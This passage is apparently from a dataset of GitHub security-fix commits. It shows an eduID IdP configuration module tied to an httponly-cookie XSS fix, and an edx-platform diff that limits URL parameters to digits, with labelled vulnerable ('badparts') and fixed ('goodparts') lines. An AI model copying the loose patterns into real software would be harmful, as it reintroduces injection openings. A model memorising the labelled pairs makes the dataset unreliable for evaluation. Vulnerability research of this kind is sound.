self._parsed_content_packages=None self._parsed_status_test_usernames=None self.section=_CONFIG_SECTION _CONFIG_DEFAULTS['debug']=str(debug) cfgdir=os.path.dirname(filename) _CONFIG_DEFAULTS['pysaml2_config']=os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config']) self.config=ConfigParser.ConfigParser(_CONFIG_DEFAULTS) if not self.config.read([filename]): raise ValueError(\"Failed loading config file{!r}\".format(filename)) @property def num_threads(self): \"\"\" Number of worker threads to start(integer). EduID IdP spawns multiple threads to make use of all CPU cores in the password pre-hash function. Number of threads should probably be about 2x number of cores to 4x number of cores(if hyperthreading is available). \"\"\" return self.config.getint(self.section, 'num_threads') @property def logdir(self): \"\"\" Path to CherryPy logfiles(string). Something like '/var/log/idp' maybe. \"\"\" res=self.config.get(self.section, 'logdir') if not res: res=None return res @property def logfile(self): \"\"\" Path to application logfile. Something like '/var/log/idp/eduid_idp.log' maybe. \"\"\" res=self.config.get(self.section, 'logfile') if not res: res=None return res @property def syslog_socket(self): \"\"\" Syslog socket to log to(string). Something like '/dev/log' maybe. \"\"\" res=self.config.get(self.section, 'syslog_socket') if not res: res=None return res @property def debug(self): \"\"\" Set to True to log debug messages(boolean). \"\"\" return self.config.getboolean(self.section, 'debug') @property def syslog_debug(self): \"\"\" Set to True to log debug messages to syslog(also requires syslog_socket)(boolean). \"\"\" return self.config.getboolean(self.section, 'syslog_debug') @property def listen_addr(self): \"\"\" IP address to listen on. \"\"\" return self.config.get(self.section, 'listen_addr') @property def listen_port(self): \"\"\" The port the IdP authentication should listen on(integer). \"\"\" return self.config.getint(self.section, 'listen_port') @property def pysaml2_config(self): \"\"\" pysaml2 configuration file. Separate config file with SAML related parameters. \"\"\" return self.config.get(self.section, 'pysaml2_config') @property def fticks_secret_key(self): \"\"\" SAML F-TICKS user anonymization key. If this is set, the IdP will log FTICKS data on every login. \"\"\" return self.config.get(self.section, 'fticks_secret_key') @property def fticks_format_string(self): \"\"\" Get SAML F-TICKS format string. \"\"\" return self.config.get(self.section, 'fticks_format_string') @property def static_dir(self): \"\"\" Directory with static files to be served. \"\"\" return self.config.get(self.section, 'static_dir') @property def ssl_adapter(self): \"\"\" CherryPy SSL adapter class to use(must be one of cherrypy.wsgiserver.ssl_adapters) \"\"\" return self.config.get(self.section, 'ssl_adapter') @property def server_cert(self): \"\"\" SSL certificate filename(None==SSL disabled) \"\"\" return self.config.get(self.section, 'server_cert') @property def server_key(self): \"\"\" SSL private key filename(None==SSL disabled) \"\"\" return self.config.get(self.section, 'server_key') @property def cert_chain(self): \"\"\" SSL certificate chain filename \"\"\" return self.config.get(self.section, 'cert_chain') @property def userdb_mongo_uri(self): \"\"\" UserDB MongoDB connection URI(string). See MongoDB documentation for details. \"\"\" return self.config.get(self.section, 'userdb_mongo_uri') @property def userdb_mongo_database(self): \"\"\" UserDB database name. \"\"\" return self.config.get(self.section, 'userdb_mongo_database') @property def sso_session_lifetime(self): \"\"\" Lifetime of SSO session(in minutes). If a user has an active SSO session, they will get SAML assertions made without having to authenticate again(unless SP requires it through ForceAuthn). The total time a user can access a particular SP would therefor be this value, plus the pysaml2 lifetime of the assertion. \"\"\" return self.config.getint(self.section, 'sso_session_lifetime') @property def sso_session_mongo_uri(self): \"\"\" SSO session MongoDB connection URI(string). See MongoDB documentation for details. If not set, an in-memory SSO session cache will be used. \"\"\" return self.config.get(self.section, 'sso_session_mongo_uri') @property def raven_dsn(self): \"\"\" Raven DSN(string) for logging exceptions to Sentry. \"\"\" return self.config.get(self.section, 'raven_dsn') @property def content_packages(self): \"\"\" Get list of tuples with packages and paths to content resources, such as login.html. The expected format in the INI file is content_packages=pkg1:some/path/, pkg2:foo :return: list of(pkg, path) tuples \"\"\" if self._parsed_content_packages: return self._parsed_content_packages value=self.config.get(self.section, 'content_packages') res=[] for this in value.split(','): this=this.strip() name, _sep, path,=this.partition(':') res.append((name, path)) self._parsed_content_packages=res return res @property def verify_request_signatures(self): \"\"\" Verify request signatures, if they exist. This defaults to False since it is a trivial DoS to consume all the IdP:s CPU resources if this is set to True. \"\"\" res=self.config.get(self.section, 'verify_request_signatures') return bool(int(res)) @property def status_test_usernames(self): \"\"\" Get list of usernames valid for use with the /status URL. If this list is['*'], all usernames are allowed for /status. :return: list of usernames :rtype: list[string] \"\"\" if self._parsed_status_test_usernames: return self._parsed_status_test_usernames value=self.config.get(self.section, 'status_test_usernames') res=[x.strip() for x in value.split(',')] self._parsed_status_test_usernames=res return res @property def signup_link(self): \"\"\" URL(string) for use in simple templating of login.html. \"\"\" return self.config.get(self.section, 'signup_link') @property def dashboard_link(self): \"\"\" URL(string) for use in simple templating of forbidden.html. \"\"\" return self.config.get(self.section, 'dashboard_link') @property def password_reset_link(self): \"\"\" URL(string) for use in simple templating of login.html. \"\"\" return self.config.get(self.section, 'password_reset_link') @property def default_language(self): \"\"\" Default language code to use when looking for web pages('en'). \"\"\" return self.config.get(self.section, 'default_language') @property def base_url(self): \"\"\" Base URL of the IdP. The default base URL is constructed from the Request URI, but for example if there is a load balancer/SSL terminator in front of the IdP it might be required to specify the URL of the service. \"\"\" return self.config.get(self.section, 'base_url') @property def default_eppn_scope(self): \"\"\" The scope to append to any unscoped eduPersonPrincipalName attributes found on users in the userdb. \"\"\" return self.config.get(self.section, 'default_eppn_scope') @property def authn_info_mongo_uri(self): \"\"\" Authn info(failed logins etc.) MongoDB connection URI(string). See MongoDB documentation for details. If not set, Kantara authn logs will not be maintained. \"\"\" return self.config.get(self.section, 'authn_info_mongo_uri') @property def max_authn_failures_per_month(self): \"\"\" Disallow login for a user after N failures in a given month. This is said to be an imminent Kantara requirement. \"\"\" return self.config.getint(self.section, 'max_authn_failures_per_month') @property def login_state_ttl(self): \"\"\" Lifetime of state kept in IdP login phase. This is the time, in minutes, a user has to complete the login phase. After this time, login cannot complete because the SAMLRequest, RelayState and possibly other needed information will be forgotten. \"\"\" return self.config.getint(self.section, 'login_state_ttl') @property def default_scoped_affiliation(self): \"\"\" Add a default eduPersonScopedAffiliation if none is returned from the attribute manager. \"\"\" return self.config.get(self.section, 'default_scoped_affiliation') @property def vccs_url(self): \"\"\" URL to use with VCCS client. BCP is to have an nginx or similar on localhost that will proxy requests to a currently available backend using TLS. \"\"\" return self.config.get(self.section, 'vccs_url') @property def insecure_cookies(self): \"\"\" Set to True to NOT set HTTP Cookie 'secure' flag(boolean). \"\"\" return self.config.getboolean(self.section, 'insecure_cookies') ", "sourceWithComments": "#\n# Copyright (c) 2013, 2014 NORDUnet A/S\n# All rights reserved.\n#\n#   Redistribution and use in source and binary forms, with or\n#   without modification, are permitted provided that the following\n#   conditions are met:\n#\n#     1. Redistributions of source code must retain the above copyright\n#        notice, this list of conditions and the following disclaimer.\n#     2. Redistributions in binary form must reproduce the above\n#        copyright notice, this list of conditions and the following\n#        disclaimer in the documentation and/or other materials provided\n#        with the distribution.\n#     3. Neither the name of the NORDUnet nor the names of its\n#        contributors may be used to endorse or promote products derived\n#        from this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n# \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n# POSSIBILITY OF SUCH DAMAGE.\n#\n# Author : Fredrik Thulin <fredrik@thulin.net>\n#\n\"\"\"\nConfiguration (file) handling for eduID IdP.\n\"\"\"\n\nimport os\nimport ConfigParser\n\n_CONFIG_DEFAULTS = {'debug': False,  # overwritten in IdPConfig.__init__()\n                    'syslog_debug': '0',              # '1' for True, '0' for False\n                    'num_threads': '8',\n                    'logdir': None,\n                    'logfile': None,\n                    'syslog_socket': None,            # syslog socket to log to (/dev/log maybe)\n                    'listen_addr': '0.0.0.0',\n                    'listen_port': '8088',\n                    'pysaml2_config': 'idp_conf.py',  # path prepended in IdPConfig.__init__()\n                    'fticks_secret_key': None,\n                    'fticks_format_string': 'F-TICKS/SWAMID/2.0#TS={ts}#RP={rp}#AP={ap}#PN={pn}#AM={am}#',\n                    'static_dir': None,\n                    'ssl_adapter': 'builtin',  # one of cherrypy.wsgiserver.ssl_adapters\n                    'server_cert': None,  # SSL cert filename\n                    'server_key': None,   # SSL key filename\n                    'cert_chain': None,   # SSL certificate chain filename, or None\n                    'userdb_mongo_uri': None,\n                    'userdb_mongo_database': None,\n                    'sso_session_lifetime': '15',  # Lifetime of SSO session in minutes\n                    'sso_session_mongo_uri': None,\n                    'raven_dsn': None,\n                    'content_packages': [],  # List of Python packages (\"name:path\") with content resources\n                    'verify_request_signatures': '0',  # '1' for True, '0' for False\n                    'status_test_usernames': [],\n                    'signup_link': '#',  # for login.html\n                    'dashboard_link': '#',  # for forbidden.html\n                    'password_reset_link': '#',  # for login.html\n                    'default_language': 'en',\n                    'base_url': None,\n                    'default_eppn_scope': None,\n                    'authn_info_mongo_uri': None,\n                    'max_authn_failures_per_month': '50',  # Kantara 30-day bad authn limit is 100\n                    'login_state_ttl': '5',   # time to complete an IdP login, in minutes\n                    'default_scoped_affiliation': None,\n                    'vccs_url': 'http://localhost:8550/',    # VCCS backend URL\n                    'insecure_cookies': '0',                     # Set to 1 to not set HTTP Cookie 'secure' flag\n                    }\n\n_CONFIG_SECTION = 'eduid_idp'\n\n\nclass IdPConfig(object):\n\n    \"\"\"\n    Class holding IdP application configuration.\n\n    Loads configuration from an INI-file at instantiation.\n\n    :param filename: string, INI-file name\n    :param debug: boolean, default debug value\n    :raise ValueError: if INI-file can't be parsed\n    \"\"\"\n\n    def __init__(self, filename, debug):\n        self._parsed_content_packages = None\n        self._parsed_status_test_usernames = None\n        self.section = _CONFIG_SECTION\n        _CONFIG_DEFAULTS['debug'] = str(debug)\n        cfgdir = os.path.dirname(filename)\n        _CONFIG_DEFAULTS['pysaml2_config'] = os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config'])\n        self.config = ConfigParser.ConfigParser(_CONFIG_DEFAULTS)\n        if not self.config.read([filename]):\n            raise ValueError(\"Failed loading config file {!r}\".format(filename))\n\n    @property\n    def num_threads(self):\n        \"\"\"\n        Number of worker threads to start (integer).\n\n        EduID IdP spawns multiple threads to make use of all CPU cores in the password\n        pre-hash function.\n        Number of threads should probably be about 2x number of cores to 4x number of\n        cores (if hyperthreading is available).\n        \"\"\"\n        return self.config.getint(self.section, 'num_threads')\n\n    @property\n    def logdir(self):\n        \"\"\"\n        Path to CherryPy logfiles (string). Something like '/var/log/idp' maybe.\n        \"\"\"\n        res = self.config.get(self.section, 'logdir')\n        if not res:\n            res = None\n        return res\n\n    @property\n    def logfile(self):\n        \"\"\"\n        Path to application logfile. Something like '/var/log/idp/eduid_idp.log' maybe.\n        \"\"\"\n        res = self.config.get(self.section, 'logfile')\n        if not res:\n            res = None\n        return res\n\n    @property\n    def syslog_socket(self):\n        \"\"\"\n        Syslog socket to log to (string). Something like '/dev/log' maybe.\n        \"\"\"\n        res = self.config.get(self.section, 'syslog_socket')\n        if not res:\n            res = None\n        return res\n\n    @property\n    def debug(self):\n        \"\"\"\n        Set to True to log debug messages (boolean).\n        \"\"\"\n        return self.config.getboolean(self.section, 'debug')\n\n    @property\n    def syslog_debug(self):\n        \"\"\"\n        Set to True to log debug messages to syslog (also requires syslog_socket) (boolean).\n        \"\"\"\n        return self.config.getboolean(self.section, 'syslog_debug')\n\n    @property\n    def listen_addr(self):\n        \"\"\"\n        IP address to listen on.\n        \"\"\"\n        return self.config.get(self.section, 'listen_addr')\n\n    @property\n    def listen_port(self):\n        \"\"\"\n        The port the IdP authentication should listen on (integer).\n        \"\"\"\n        return self.config.getint(self.section, 'listen_port')\n\n    @property\n    def pysaml2_config(self):\n        \"\"\"\n        pysaml2 configuration file. Separate config file with SAML related parameters.\n        \"\"\"\n        return self.config.get(self.section, 'pysaml2_config')\n\n    @property\n    def fticks_secret_key(self):\n        \"\"\"\n        SAML F-TICKS user anonymization key. If this is set, the IdP will log FTICKS data\n        on every login.\n        \"\"\"\n        return self.config.get(self.section, 'fticks_secret_key')\n\n    @property\n    def fticks_format_string(self):\n        \"\"\"\n        Get SAML F-TICKS format string.\n        \"\"\"\n        return self.config.get(self.section, 'fticks_format_string')\n\n    @property\n    def static_dir(self):\n        \"\"\"\n        Directory with static files to be served.\n        \"\"\"\n        return self.config.get(self.section, 'static_dir')\n\n    @property\n    def ssl_adapter(self):\n        \"\"\"\n        CherryPy SSL adapter class to use (must be one of cherrypy.wsgiserver.ssl_adapters)\n        \"\"\"\n        return self.config.get(self.section, 'ssl_adapter')\n\n    @property\n    def server_cert(self):\n        \"\"\"\n        SSL certificate filename (None == SSL disabled)\n        \"\"\"\n        return self.config.get(self.section, 'server_cert')\n\n    @property\n    def server_key(self):\n        \"\"\"\n        SSL private key filename (None == SSL disabled)\n        \"\"\"\n        return self.config.get(self.section, 'server_key')\n\n    @property\n    def cert_chain(self):\n        \"\"\"\n        SSL certificate chain filename\n        \"\"\"\n        return self.config.get(self.section, 'cert_chain')\n\n    @property\n    def userdb_mongo_uri(self):\n        \"\"\"\n        UserDB MongoDB connection URI (string). See MongoDB documentation for details.\n        \"\"\"\n        return self.config.get(self.section, 'userdb_mongo_uri')\n\n    @property\n    def userdb_mongo_database(self):\n        \"\"\"\n        UserDB database name.\n        \"\"\"\n        return self.config.get(self.section, 'userdb_mongo_database')\n\n    @property\n    def sso_session_lifetime(self):\n        \"\"\"\n        Lifetime of SSO session (in minutes).\n\n        If a user has an active SSO session, they will get SAML assertions made\n        without having to authenticate again (unless SP requires it through\n        ForceAuthn).\n\n        The total time a user can access a particular SP would therefor be\n        this value, plus the pysaml2 lifetime of the assertion.\n        \"\"\"\n        return self.config.getint(self.section, 'sso_session_lifetime')\n\n    @property\n    def sso_session_mongo_uri(self):\n        \"\"\"\n        SSO session MongoDB connection URI (string). See MongoDB documentation for details.\n\n        If not set, an in-memory SSO session cache will be used.\n        \"\"\"\n        return self.config.get(self.section, 'sso_session_mongo_uri')\n\n    @property\n    def raven_dsn(self):\n        \"\"\"\n        Raven DSN (string) for logging exceptions to Sentry.\n        \"\"\"\n        return self.config.get(self.section, 'raven_dsn')\n\n    @property\n    def content_packages(self):\n        \"\"\"\n        Get list of tuples with packages and paths to content resources, such as login.html.\n\n        The expected format in the INI file is\n\n            content_packages = pkg1:some/path/, pkg2:foo\n\n        :return: list of (pkg, path) tuples\n        \"\"\"\n        if self._parsed_content_packages:\n            return self._parsed_content_packages\n        value = self.config.get(self.section, 'content_packages')\n        res = []\n        for this in value.split(','):\n            this = this.strip()\n            name, _sep, path, = this.partition(':')\n            res.append((name, path))\n        self._parsed_content_packages = res\n        return res\n\n    @property\n    def verify_request_signatures(self):\n        \"\"\"\n        Verify request signatures, if they exist.\n\n        This defaults to False since it is a trivial DoS to consume all the IdP:s\n        CPU resources if this is set to True.\n        \"\"\"\n        res = self.config.get(self.section, 'verify_request_signatures')\n        return bool(int(res))\n\n    @property\n    def status_test_usernames(self):\n        \"\"\"\n        Get list of usernames valid for use with the /status URL.\n\n        If this list is ['*'], all usernames are allowed for /status.\n\n        :return: list of usernames\n\n        :rtype: list[string]\n        \"\"\"\n        if self._parsed_status_test_usernames:\n            return self._parsed_status_test_usernames\n        value = self.config.get(self.section, 'status_test_usernames')\n        res = [x.strip() for x in value.split(',')]\n        self._parsed_status_test_usernames = res\n        return res\n\n    @property\n    def signup_link(self):\n        \"\"\"\n        URL (string) for use in simple templating of login.html.\n        \"\"\"\n        return self.config.get(self.section, 'signup_link')\n\n    @property\n    def dashboard_link(self):\n        \"\"\"\n        URL (string) for use in simple templating of forbidden.html.\n        \"\"\"\n        return self.config.get(self.section, 'dashboard_link')\n\n    @property\n    def password_reset_link(self):\n        \"\"\"\n        URL (string) for use in simple templating of login.html.\n        \"\"\"\n        return self.config.get(self.section, 'password_reset_link')\n\n    @property\n    def default_language(self):\n        \"\"\"\n        Default language code to use when looking for web pages ('en').\n        \"\"\"\n        return self.config.get(self.section, 'default_language')\n\n    @property\n    def base_url(self):\n        \"\"\"\n        Base URL of the IdP. The default base URL is constructed from the\n        Request URI, but for example if there is a load balancer/SSL\n        terminator in front of the IdP it might be required to specify\n        the URL of the service.\n        \"\"\"\n        return self.config.get(self.section, 'base_url')\n\n    @property\n    def default_eppn_scope(self):\n        \"\"\"\n        The scope to append to any unscoped eduPersonPrincipalName\n        attributes found on users in the userdb.\n        \"\"\"\n        return self.config.get(self.section, 'default_eppn_scope')\n\n    @property\n    def authn_info_mongo_uri(self):\n        \"\"\"\n        Authn info (failed logins etc.) MongoDB connection URI (string).\n        See MongoDB documentation for details.\n\n        If not set, Kantara authn logs will not be maintained.\n        \"\"\"\n        return self.config.get(self.section, 'authn_info_mongo_uri')\n\n    @property\n    def max_authn_failures_per_month(self):\n        \"\"\"\n        Disallow login for a user after N failures in a given month.\n\n        This is said to be an imminent Kantara requirement.\n        \"\"\"\n        return self.config.getint(self.section, 'max_authn_failures_per_month')\n\n    @property\n    def login_state_ttl(self):\n        \"\"\"\n        Lifetime of state kept in IdP login phase.\n\n        This is the time, in minutes, a user has to complete the login phase.\n        After this time, login cannot complete because the SAMLRequest, RelayState\n        and possibly other needed information will be forgotten.\n        \"\"\"\n        return self.config.getint(self.section, 'login_state_ttl')\n\n    @property\n    def default_scoped_affiliation(self):\n        \"\"\"\n        Add a default eduPersonScopedAffiliation if none is returned from the\n        attribute manager.\n        \"\"\"\n        return self.config.get(self.section, 'default_scoped_affiliation')\n\n    @property\n    def vccs_url(self):\n        \"\"\"\n        URL to use with VCCS client. BCP is to have an nginx or similar on\n        localhost that will proxy requests to a currently available backend\n        using TLS.\n        \"\"\"\n        return self.config.get(self.section, 'vccs_url')\n\n    @property\n    def insecure_cookies(self):\n        \"\"\"\n        Set to True to NOT set HTTP Cookie 'secure' flag (boolean).\n        \"\"\"\n        return self.config.getboolean(self.section, 'insecure_cookies')\n"}}, "msg": "Set httponly flag to protect against common XSS vulnerabilities"}}, "https://github.com/ExtensionEngine/ed2go-edx-platform": {"4e4c209ae3deb4c78bcec89c181516af8604b450": {"url": "https://api.github.com/repos/ExtensionEngine/ed2go-edx-platform/commits/4e4c209ae3deb4c78bcec89c181516af8604b450", "html_url": "https://github.com/ExtensionEngine/ed2go-edx-platform/commit/4e4c209ae3deb4c78bcec89c181516af8604b450", "sha": "4e4c209ae3deb4c78bcec89c181516af8604b450", "keyword": "XSS malicious", "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 776a518599..fe9882b180 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,27 +223,27 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n", "message": "", "files": {"/lms/urls.py": {"changes": [{"diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n", "add": 12, "remove": 12, "filename": "/lms/urls.py", "badparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "            'staticbook.views.pdf_index'),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "            'staticbook.views.pdf_index'),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',", "            'staticbook.views.pdf_index'),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "            'staticbook.views.html_index'),"], "goodparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',", "            'staticbook.views.pdf_index', name=\"pdf_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',", "            'staticbook.views.pdf_index', name=\"pdf_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',", "            'staticbook.views.pdf_index', name=\"pdf_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',", "            'staticbook.views.html_index', name=\"html_book\"),", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"]}], "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', 